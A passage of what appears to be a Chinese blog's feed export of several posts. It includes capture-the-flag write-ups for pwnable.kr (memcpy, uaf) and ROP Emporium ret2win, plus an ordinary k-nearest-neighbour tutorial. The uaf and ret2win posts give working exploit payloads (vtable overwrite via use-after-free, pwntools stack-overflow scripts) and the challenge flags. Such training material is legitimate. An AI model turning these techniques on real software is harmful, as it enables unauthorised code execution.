class="line">info:256 512 , input: 261</span><br><span class="line">info:512 1024 , input: 517</span><br><span class="line">info:1024 2048 , input: 1029</span><br><span class="line">info:2048 4096 , input: 2053</span><br><span class="line">info:4096 8192 , input: 4101</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ok, lets run the experiment with your configuration</span><br><span class="line">experiment 1 : memcpy with buffer size 8</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 2036</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 172</span><br><span class="line"></span><br><span class="line">experiment 2 : memcpy with buffer size 21</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 220</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 252</span><br><span class="line"></span><br><span class="line">experiment 3 : memcpy with buffer size 37</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 336</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 388</span><br><span class="line"></span><br><span class="line">experiment 4 : memcpy with buffer size 69</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 508</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 182</span><br><span class="line"></span><br><span class="line">experiment 5 : memcpy with buffer size 133</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1042</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 152</span><br><span class="line"></span><br><span class="line">experiment 6 : memcpy with buffer size 261</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1854</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 204</span><br><span class="line"></span><br><span class="line">experiment 7 : memcpy with buffer size 517</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 3658</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 186</span><br><span class="line"></span><br><span class="line">experiment 8 : memcpy with buffer size 1029</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 7146</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 374</span><br><span class="line"></span><br><span class="line">experiment 9 : memcpy with buffer size 2053</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 14326</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 680</span><br><span class="line"></span><br><span class="line">experiment 10 : memcpy with buffer size 4101</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 30404</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 1284</span><br><span class="line"></span><br><span class="line">thanks for helping my experiment!</span><br><span class="line">flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习1——K近邻算法</title>
    <url>/437066e7.html</url>
    <content><![CDATA[<blockquote><p>K近邻算法：一种基本的分类算法</p></blockquote><h2><span id="pji-ben-nei-rong">基本内容</span><a href="#pji-ben-nei-rong" class="header-anchor">#</a></h2><p>输入：实例的特征向量</p><p>输出：实例的类别</p><p>思想：近朱者赤近墨者黑，对于输入实例x，选取距离x最近的K个点，x的分类结果就是K个点中数目最多的那个类别</p><p>三个要素：</p><ul><li>K的选择</li><li>距离的度量</li><li>分类决策规则</li></ul><p>优点：精度高、异常值不敏感、无数据输入假定</p><p>缺点：计算复杂度高、空间复杂度高</p><p>适用数据范围：数值型、标称型</p><a id="more"></a><h2><span id="pkai-fa-liu-cheng">开发流程</span><a href="#pkai-fa-liu-cheng" class="header-anchor">#</a></h2><ul><li>收集数据：任何方法</li><li>准备数据：距离计算所需要的数值，最好是结构化的数据格式</li><li>分析数据：任何方法</li><li>训练算法：此步骤不适用于 k-近邻算法</li><li>测试算法：计算错误率</li><li>使用算法：输入样本数据和结构化的输出结果，然后运行 k-近邻算法判断输入数据分类属于哪个分类，最后对计算出的分类执行后续处理</li></ul><h2><span id="pshi-zhan-xiang-mu">实战项目</span><a href="#pshi-zhan-xiang-mu" class="header-anchor">#</a></h2><ul><li>约会网站<a href="https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md" target="_blank" rel="noopener">https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md</a></li><li>手写数字识别<a href="https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md" target="_blank" rel="noopener">https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md</a></li></ul><p>注意点在于使用数据前一定要对数据进行归一化，否则数据范围差距过大，会引起很大问题</p><h2><span id="pgui-yi-hua-de-fang-fa">归一化的方法</span><a href="#pgui-yi-hua-de-fang-fa" class="header-anchor">#</a></h2><ul><li>线性函数转换：$y=(x-MinValue)/(MaxValue-MinValue)　　$</li><li>对数函数转换：$y=lg(x)　$ 是非线性转换，对x的取值范围有要求</li><li>反余切函数转换：$y=arctan(x)*2/PI　$，非线性转换，且对x的范围没有要求</li></ul><h2><span id="psan-yao-su">三要素</span><a href="#psan-yao-su" class="header-anchor">#</a></h2><h3><span id="pk-de-qu-zhi">K的取值</span><a href="#pk-de-qu-zhi" class="header-anchor">#</a></h3><ul><li>K小时，近似误差小，估计误差大；K大时，近似误差大，估计误差小</li><li>K小时，相当于用较小邻域中的训练实例进行预测，学习的近似误差会小，只有与输入实例相近的训练集样本才会对结果又影响。但缺点是学习误差会增大，如果恰好有噪声，则可能会出错。因此，K减小容易发生过拟合</li><li>K大时，与上面相反</li><li>可以使用交叉验证选取合适的K值</li></ul><p>PS:</p><ul><li>近似误差：可以理解为对现有训练集的训练误差。</li><li>估计误差：可以理解为对测试集的测试误差。</li></ul><h3><span id="pju-chi-du-liang">距离度量</span><a href="#pju-chi-du-liang" class="header-anchor">#</a></h3><p>通常是用欧氏距离，也可以是曼哈顿距离等</p><h3><span id="pfen-lei-jue-ce">分类决策</span><a href="#pfen-lei-jue-ce" class="header-anchor">#</a></h3><p>少数服从多数</p><h2><span id="phe-xin-suan-fa">核心算法</span><a href="#phe-xin-suan-fa" class="header-anchor">#</a></h2><ul><li>暴力计算（Brute Force）</li><li>二叉树平分参数空间（KD Tree）</li><li>超球体平分训练数据 (Ball Tree)</li></ul><p>具体可以看sklean文档 <a href="https://github.com/apachecn/sklearn-doc-zh/blob/master/docs/master/7.md" target="_blank" rel="noopener">https://github.com/apachecn/sklearn-doc-zh/blob/master/docs/master/7.md</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">clf = neighbors.KNeighborsClassifier(k, weights=<span class="string">'uniform'</span>) <span class="comment"># weights选用uniform是所有维度数据权重一致</span></span><br><span class="line">clf.fit(trainingMat, trainLabels)</span><br><span class="line">pridects = clf.predict(testMat)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AI</category>
        <category>machine_learning</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>machine learning</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— uaf</title>
    <url>/23b2d439.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, what is Use After Free bug?</span><br><span class="line"></span><br><span class="line">ssh uaf@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh uaf@pwnable.kr -p2222</code>，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="puaf-cpp">uaf.cpp</span><a href="#puaf-cpp" class="header-anchor">#</a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">	Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(op)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				m-&gt;introduce();</span><br><span class="line">				w-&gt;introduce();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">				data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">				<span class="built_in">read</span>(<span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="keyword">delete</span> m;</span><br><span class="line">				<span class="keyword">delete</span> w;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>先把文件下载下来<code>scp -P 2222 -p uaf@pwnable.kr:/home/uaf/* ./</code></p><h3><span id="pshen-qing-kuai-da-xiao">申请块大小</span><a href="#pshen-qing-kuai-da-xiao" class="header-anchor">#</a></h3><p>在main函数中可以看到以下两段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400efb:	bf 18 00 00 00       	mov    $0x18,%edi</span><br><span class="line">400f00:	e8 8b fe ff ff       	callq  400d90 &lt;_Znwm@plt&gt;</span><br><span class="line"></span><br><span class="line">400f59:	bf 18 00 00 00       	mov    $0x18,%edi</span><br><span class="line">400f5e:	e8 2d fe ff ff       	callq  400d90 &lt;_Znwm@plt&gt;</span><br></pre></td></tr></table></figure><p>都是申请了一个Fastbin块用于初始化man和woman对象<br>其中函数_Znwm可以用工具c++filt查看真实的函数名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5c619b760e10:&#x2F;ctf&#x2F;work# c++filt _Znwm</span><br><span class="line">operator new(unsigned long)</span><br></pre></td></tr></table></figure><p>由于我们要利用UAF漏洞，所以再次申请时，也需要申请一样大小的Fastbin块，所以在选择2时，我们填入大小为24。由于Fastbin是LIFO，所以我们2申请块时，第一次申请得到的是原先属于w的块，第二次申请得到的是原先属于m的块。</p><h3><span id="pdui-xiang-jie-gou">对象结构</span><a href="#pdui-xiang-jie-gou" class="header-anchor">#</a></h3><p>在while(1)处打断点，然后可以查看到fastbin信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x614e60 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x31,</span><br><span class="line">  fd &#x3D; 0x4,</span><br><span class="line">  bk &#x3D; 0x4,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x6b63614a</span><br><span class="line">&#125;</span><br><span class="line">0x614e90 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x21,</span><br><span class="line">  fd &#x3D; 0x401570 &lt;vtable for Man+16&gt;,</span><br><span class="line">  bk &#x3D; 0x19,</span><br><span class="line">  fd_nextsize &#x3D; 0x614e88,</span><br><span class="line">  bk_nextsize &#x3D; 0x31</span><br><span class="line">&#125;</span><br><span class="line">0x614eb0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x614e88,</span><br><span class="line">  mchunk_size &#x3D; 0x31,</span><br><span class="line">  fd &#x3D; 0x4,</span><br><span class="line">  bk &#x3D; 0x4,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x6c6c694a</span><br><span class="line">&#125;</span><br><span class="line">0x614ee0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x21,</span><br><span class="line">  fd &#x3D; 0x401550 &lt;vtable for Woman+16&gt;,</span><br><span class="line">  bk &#x3D; 0x15,</span><br><span class="line">  fd_nextsize &#x3D; 0x614ed8,</span><br><span class="line">  bk_nextsize &#x3D; 0x411</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以其中的块0x614e90为例，是m的结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10x 0x614e90</span><br><span class="line">0x614e90:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x614ea0:	0x0000000000401570	0x0000000000000019</span><br><span class="line">0x614eb0:	0x0000000000614e88	0x0000000000000031</span><br><span class="line">0x614ec0:	0x0000000000000004	0x0000000000000004</span><br><span class="line">0x614ed0:	0x0000000000000000	0x000000006c6c694a</span><br><span class="line">gdb-peda$ x&#x2F;10a 0x401570</span><br><span class="line">0x401570 &lt;vtable for Man+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x4012d2 &lt;Man::introduce()&gt;</span><br><span class="line">0x401580 &lt;vtable for Human&gt;:	0x0	0x4015f0 &lt;typeinfo for Human&gt;</span><br><span class="line">0x401590 &lt;vtable for Human+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401192 &lt;Human::introduce()&gt;</span><br><span class="line">0x4015a0 &lt;typeinfo name for Woman&gt;:	0x6e616d6f5735	0x0</span><br><span class="line">0x4015b0 &lt;typeinfo for Woman&gt;:	0x602390 &lt;vtable for __cxxabiv1::__si_class_type_info@@CXXABI_1.3+16&gt;	0x4015a0 &lt;typeinfo name for Woman&gt;</span><br><span class="line">gdb-peda$ x&#x2F;s 0x614e88</span><br><span class="line">0x614e88:	&quot;Jack&quot;</span><br></pre></td></tr></table></figure><p>0x401570是Man的虚表，0x19是年龄25岁，0x614e88指向字符串&quot;Jack&quot;<br>也可以查看到w的结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10x 0x614ee0</span><br><span class="line">0x614ee0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x614ef0:	0x0000000000401550	0x0000000000000015</span><br><span class="line">0x614f00:	0x0000000000614ed8	0x0000000000000411</span><br><span class="line">0x614f10:	0x0a65657266202e33	0x000000000000000a</span><br><span class="line">0x614f20:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ x&#x2F;10a 0x401550</span><br><span class="line">0x401550 &lt;vtable for Woman+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401376 &lt;Woman::introduce()&gt;</span><br><span class="line">0x401560 &lt;vtable for Man&gt;:	0x0	0x4015d0 &lt;typeinfo for Man&gt;</span><br><span class="line">0x401570 &lt;vtable for Man+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x4012d2 &lt;Man::introduce()&gt;</span><br><span class="line">0x401580 &lt;vtable for Human&gt;:	0x0	0x4015f0 &lt;typeinfo for Human&gt;</span><br><span class="line">0x401590 &lt;vtable for Human+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401192 &lt;Human::introduce()&gt;</span><br><span class="line">gdb-peda$ x&#x2F;s 0x614ed8</span><br><span class="line">0x614ed8:	&quot;Jill&quot;</span><br></pre></td></tr></table></figure><h3><span id="pxu-biao">虚表</span><a href="#pxu-biao" class="header-anchor">#</a></h3><p>当存在虚函数的继承时，会出现虚表vtable，用来索引函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Man:                       0x401570</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+0 | vtable_Man| -----&gt; |+0 give_shell |</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+8 | age       |        |+8 introduce |</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+16| name      |</span><br><span class="line"> ---------------</span><br></pre></td></tr></table></figure><p>本来调用m的introduce函数时，是<code>*(vtable_man+8)</code>，这里<code>vtable_man</code>是我们可以通过文件写入的值，为了调用到<code>give_shell</code>函数，我们只要将文件内容改成<code>(vtable_man-8)</code>的值代替原来的<code>vtable_man</code>即可</p><p>注意到这里有三个虚表，Man的，Woman的以及Human的，任意选一个即可，比如我选<code>(0x401670-8)</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uaf@pwnable:~$ python -c &quot;print &#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;&quot; &gt; &#x2F;tmp&#x2F;tmpfile</span><br><span class="line">uaf@pwnable:~$ .&#x2F;uaf 24 &#x2F;tmp&#x2F;tmpfile</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">3</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">1</span><br><span class="line">$ ls</span><br><span class="line">flag  uaf  uaf.cpp</span><br><span class="line">$ cat flag</span><br><span class="line">yay_f1ag_aft3r_pwning</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>yay_f1ag_aft3r_pwning</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP Emporium (上)</title>
    <url>/ad24c8c9.html</url>
    <content><![CDATA[<p><strong>注意</strong>：64位传参前六个参数使用寄存器RDI、RSI、RDX、RCX、R8、R9</p><a id="more"></a><h2><span id="pret2win">ret2win</span><a href="#pret2win" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><p>先查看一些基本信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ checksec ret2win32 </span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/ret2win32/ret2win32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -qs ret2win32 | grep -ve imp -e ' 0 '</span><br><span class="line">0x00002068 1 completed.7200</span><br><span class="line">0x000005f6 99 pwnme</span><br><span class="line">0x00000659 41 ret2win</span><br><span class="line">0x000006f0 2 __libc_csu_fini</span><br><span class="line">0x000004b0 4 __x86.get_pc_thunk.bx</span><br><span class="line">0x00002040 4 stderrGLIBC_2.0</span><br><span class="line">0x0000070c 4 _IO_stdin_used</span><br><span class="line">0x00000690 93 __libc_csu_init</span><br><span class="line">0x00002060 4 stdinGLIBC_2.0</span><br><span class="line">0x00000708 4 _fp_hw</span><br><span class="line">0x00002064 4 stdoutGLIBC_2.0</span><br><span class="line">0x0000057b 123 main</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -z ret2win32 </span><br><span class="line">[strings]</span><br><span class="line">addr=0x08048710 off=0x00000710 ordinal=000 sz=24 section=.rodata string=ret2win by ROP Emporium</span><br><span class="line">addr=0x08048728 off=0x00000728 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x08048731 off=0x00000731 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x0804873c off=0x0000073c ordinal=003 sz=96 section=.rodata string=For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><br><span class="line">addr=0x0804879c off=0x0000079c ordinal=004 sz=30 section=.rodata string=What could possibly go wrong?</span><br><span class="line">addr=0x080487bc off=0x000007bc ordinal=005 sz=100 section=.rodata string=You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!</span><br><span class="line">addr=0x08048821 off=0x00000821 ordinal=006 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048824 off=0x00000824 ordinal=007 sz=29 section=.rodata string=Thank you! Here's your flag:</span><br><span class="line">addr=0x08048841 off=0x00000841 ordinal=008 sz=18 section=.rodata string=/bin/cat flag.txt</span><br></pre></td></tr></table></figure><p>看到有函数<code>pwnme</code>,<code>ret2win</code>,同时也有字符串<code>/bin/cat flag.txt</code>。<br>再用IDA看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ret2win by ROP Emporium"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"32bits\n"</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nExiting"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"</span></span><br><span class="line">    <span class="string">"What could possibly go wrong?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Thank you! Here's your flag:"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本很明白了，利用pwnme中的s栈溢出跳转到ret2win部分即可</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">ret_addr = <span class="number">0x8048659</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(ret_addr)</span><br><span class="line">p = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者直接<code>python -c &quot;print 'a'*(0x28+4)+'\x59\x86\x04\x08'&quot; | ./ret2win32</code></p><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win$ checksec ret2win</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/ret2win/ret2win'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>和32没什么区别，IDA看下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 